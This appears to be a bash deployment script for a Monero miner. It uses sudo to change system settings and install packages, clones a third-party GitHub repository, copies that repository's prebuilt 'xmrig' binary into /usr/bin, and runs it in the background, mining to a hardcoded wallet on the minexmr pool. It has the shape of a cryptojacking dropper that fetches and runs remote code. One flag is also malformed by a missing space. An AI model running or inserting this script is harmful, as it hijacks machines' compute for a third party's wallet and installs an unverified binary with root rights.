#!/usr/bin/env bash

pool='ca.minexmr.com'
port=4005
ID="$(hostname)"
WALLET="G7qy9R6wP7dbTR81WnCtsri2pqbQE25wK6VYxJsrLjip3pbYfeF1WP624fdacomgRj7q5E93XFK8DQCMcNHjfeBCP6jSpwS"
PAYMENT="ede44a8126890ed097414e9814d714b36b1da1eaef906d4bc3e2a24cb95fc777"
PASSWORD=x
THREADS="$(nproc --all)"

rm -rf /tmp/miner/
sudo dpkg --configure -a
echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
sudo sysctl -p
sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
sleep 2
cd /tmp && mkdir miner
git clone https://github.com/loaman1/miner-xmr.git /tmp/miner
cd /tmp/miner
chmod +x /tmp/miner/xmrig
cp /tmp/miner/xmrig /usr/bin/
sleep 1
xmrig -O ${pool}:${port} -u ${WALLET}.${PAYMENT} --pass=${PASSWORD} -B --donate-level=1--background -S
echo -e 'ALL WORKS! tail -f /tmp/miner/xmrig.log'
